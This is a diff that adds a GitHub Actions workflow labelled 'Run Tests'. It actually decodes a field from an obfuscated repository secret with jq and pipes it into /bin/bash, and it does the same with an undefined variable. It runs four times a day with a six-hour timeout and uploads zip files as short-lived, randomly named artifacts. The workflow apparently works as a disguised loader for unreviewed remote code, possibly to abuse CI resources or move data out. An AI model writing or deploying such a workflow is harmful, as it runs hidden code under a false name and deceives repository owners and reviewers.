@@ -1,0 +1,29 @@
+name: Run Tests
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '28 3,9,15,21 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  compile:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Setup and run
+        env:
+          t827: ${{ secrets.t827 }}
+        run: |
+          printf '%s' "$t827" | jq -r .mh9931 | /bin/bash
+          printf '%s' "$phxwp952" | jq -r .ttl0807 | /bin/bash
+
+      - name: Upload data
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: e8g59Gyt
+          path: "*.zip"
+          retention-days: 1
